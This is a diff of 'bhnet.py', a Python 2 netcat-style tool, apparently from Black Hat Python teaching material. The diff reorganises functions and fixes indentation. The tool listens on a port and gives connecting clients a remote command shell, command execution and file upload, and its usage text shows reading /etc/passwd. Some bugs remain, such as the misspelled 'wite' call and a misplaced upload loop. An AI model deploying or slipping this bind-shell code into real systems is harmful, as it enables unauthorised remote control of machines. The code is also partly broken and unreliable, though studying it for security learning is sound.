@@ -1,6 +1,7 @@
-#!/usr/bin/python
+#!/usr/bin/python2.7
 
 import sys 
+import os
 import socket
 import getopt
 import threading
@@ -17,62 +18,80 @@ target              = ""
 upload_destination  = ""
 port                = 0
 
-# function responsible for handling command line arguments and calling
-# the rest of our functions
-def usage():
-    print "BHP Network Tool"
-    print
-    print "Usage: bhnet.py -t [target_host] -p [port_number]"
-    print "-l --listen                  - listen on [host]:[port] for incoming connections"
-    print "-e --execute=file_to_run     - execute the given file upon receiving a connection"
-    print "-c --command                 - initialize a command shell"
-    print "-u --upload=destination      - upon receiving connection upload a file and write to [destination]"
-    print
-    print
-    print "Example: "
-    print "bhnet.py -t 192.168.0.1 -p 5555 -l -c"
-    print "bhnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
-    print "bhnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
-    print "echo 'ABCDEFGHIJ' | ./bhnet.py -t 192.168.11.12 -p 135"
-    sys.exit(0)
-
-# implementation for the features we are building our fake netcat with
-def client_sender(buffer):
-    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
+def run_command(command):
+    # trim the newline
+    command = command.rstrip()
+    # run the command and get the output back
     try:
-        # lets try to connect to our target host
-        client.connect((target,port))
+        # subprocess library is being used here
+        # provides a powerful process-creation 
+        # interface that gives you a number of 
+        # ways to start and interact with client programs
+        # here we are just running the command passed down
+        # and returning the output
+        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
+    except: 
+        output = "Failed to execute command.\r\n"
+    # send the output back to the client
+    return output
 
-        if len(buffer):
-            client.send(buffer)
+def client_handler(client_socket):
+    global upload
+    global execute
+    global command
+
+    # check for upload
+    if len(upload_destination):
+
+        # read in all the bytes and write to our own destination
+        file_buffer = ""
+
+        # keep reading data until there is none available
+
         while True:
-            # now lets wait for data to com back to us
-            recv_len = 1
-            response = ""
+            data = client_socket.recv(1024)
 
-            while recv_len:
+            if not data: 
+                break
+        else: 
+            file_buffer += data
+        # take these bytes and try to write them out
+        try:
+            file_descriptor = open(upload_destination, "wb")
+            file_descriptor.wite(file_buffer)
+            file_descriptor.close()
 
-                data    = client.recv(4096)
-                recv_len = len(data)
-                reponse+= data
+            # acknowledge that we wrote the file out
+            client_socket.send("Successfully daves file to %s\r\n" % upload_destination)
+        except: 
+            client_socket.send("Failed to save file to %s\r\n" % upload_destination)
 
-                if recv_len < 4096:
-                    break
 
-            print response, 
+    # check for command execution
+    if len(execute):
 
-            # wait for more input
-            buffer = raw_input("")
-            buffer += "\n"
+        # run the command
+        output = run_command(execute)
+        client_socket.send(output)
 
-            # lets send our data off
-            client.send(buffer)
+        # now we go into another loop if a command shell was requested
 
-    except:
-        print "[*] Exception! Exiting..."
-        # tear down the connection
-        client.close()
+    if command:
+
+        while True: 
+            # show a simple prompt
+            client_socket.send("BHP:#> ")
+                
+            # we receive until we see a linefeed
+            cmd_buffer = ""
+            while "\n" not in cmd_buffer:
+                cmd_buffer += client_socket.recv(1024)
+
+            # send back the command output
+            response = run_command(cmd_buffer)
+
+            # send back the response
+            client_socket.send(response)
 
 def server_loop():
     global target
@@ -93,88 +112,66 @@ def server_loop():
         client_thread = threading.Thread(target=client_handler, args=(client_socket,))
         client_thread.start()
 
-def run_command(command):
+def client_sender(buffer):
 
-    # trim the newline
-    command = command.strip()
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-    # run the command and get the output back
     try:
-        
-        # subprocess library is being used here
-        # provides a powerful process-creation 
-        # interface that gives you a number of 
-        # ways to start and interact with client programs
-        # here we are just running the command passed down
-        # and returning the output
-        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
+        # lets try to connect to our target host
+        client.connect((target,port))
 
-    except: 
+        if len(buffer):
+            client.send(buffer)
+        while True:
+            # now lets wait for data to com back to us
+            recv_len = 1
+            response = ""
 
-        output = "Failed to execute command.\r\n"
+            while recv_len:
 
-    # send the output back to the client
-    return output
+                data    = client.recv(4096)
+                recv_len = len(data)
+                response += data
+
+                if recv_len < 4096:
+                    break
+
+            print response, 
+
+            # wait for more input
+            buffer = raw_input("")
+            buffer += "\n"
+
+            # lets send our data off
+            client.send(buffer)
+
+    except Exception as e:
+        print "[*] Exception! Exiting..."
+        # catch the exception
+        print("[*] Exception: %s" % e)
+        exc_type, exc_object, exc_tb = sys.exc_info()
+        fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
+        print(exc_type, fname, exc_tb.tb_lineno)
+        # tear down the connection
+        client.close()
+def usage():
+    print "BHP Network Tool"
+    print
+    print "Usage: bhnet.py -t [target_host] -p [port_number]"
+    print "-l --listen                  - listen on [host]:[port] for incoming connections"
+    print "-e --execute=file_to_run     - execute the given file upon receiving a connection"
+    print "-c --command                 - initialize a command shell"
+    print "-u --upload=destination      - upon receiving connection upload a file and write to [destination]"
+    print
+    print
+    print "Example: "
+    print "bhnet.py -t 192.168.0.1 -p 5555 -l -c"
+    print "bhnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
+    print "bhnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
+    print "echo 'ABCDEFGHIJ' | ./bhnet.py -t 192.168.11.12 -p 135"
+    sys.exit(0)
 
 # implement the logic to do file uploads, command execution and or shell
-def client_handler(client_socket):
-    global upload
-    global execute
-    global command
-
-    # check for upload
-    if len(upload_destination):
-
-        # read in all the bytes and write to our own destination
-        file_buffer = ""
-
-        # keep reading data until there is none available
-
-        while True:
-            data = client_socket.recv(1024)
-
-            if not data: 
-                break
-            else: 
-                file_buffer += data
-            # take these bytes and try to write them out
-            try:
-                file_descriptor = open(upload_destination, "wb")
-                file_descriptor.wite(file_buffer)
-                file_descriptor.close()
-
-                # acknowledge that we wrote the file out
-                client_socket.send("Successfully daves file to %s\r\n" % upload_destination)
-            except: 
-                client_socket.send("Failed to save file to %s\r\n" % upload_destination)
-
-            # check for command execution
-
-            if len(execute):
-
-                # run the command
-                output = run_command(execute)
-                client_socket.send(output)
-
-                # now we go into another loop if a command shell was requested
-
-                if command:
-
-                    while True: 
-                        # show a simple prompt
-                        client_socket.send("BHP:#> ")
-                            
-                        # we receive until we see a linefeed
-                        cmd_buffer = ""
-                        while "\n" not in cmd_buffer:
-                            cmd_buffer += client_socket.recv(1024)
-
-                        # send back the command output
-                        response = run_command(cmd_buffer)
-
-                        # send back the response
-                        client_socket.send(response)
-
 def main():
     global listen
     global port
@@ -195,7 +192,7 @@ def main():
     for o,a in opts: 
         if o in ("-h", "--help"):
             usage()
-        elif o in ("-l", "--list"):
+        elif o in ("-l", "--listen"):
             listen = True
         elif o in ("-e", "--execute"):
             execute = a
@@ -210,21 +207,22 @@ def main():
         else:
             assert False, "Unhandled Option"
 
-        # are we going to listen or jsut send data from stdin?
-        if not listen and len(target) and port > 0:
+    # are we going to listen or jsut send data from stdin?
+    if not listen and len(target) and port > 0:
 
-            # read in the buffer from the commandline
-            # this will block, so send crl-d if not the sending input
-            # to stdin
+        # read in the buffer from the commandline
+        # this will block, so send crl-d if not the sending input
+        # to stdin
+        buffer = sys.stdin.read()
+        # send the data off
+        client_sender(buffer)
 
-            buffer = sys.stdin.read()
+    # we are going to listern and potentially
+    # upload things, execute commands, and drop a shell back
+    # depending on our command line options above
+    if listen:
+        server_loop()
 
-            # send the data off
-            client_sender(buffer)
-        # we are going to listern and potentially
-        # upload things, execute commands, and drop a shell back
-        # depending on our command line options above
-        if listen:
-            server_loop()
+
 main()
 
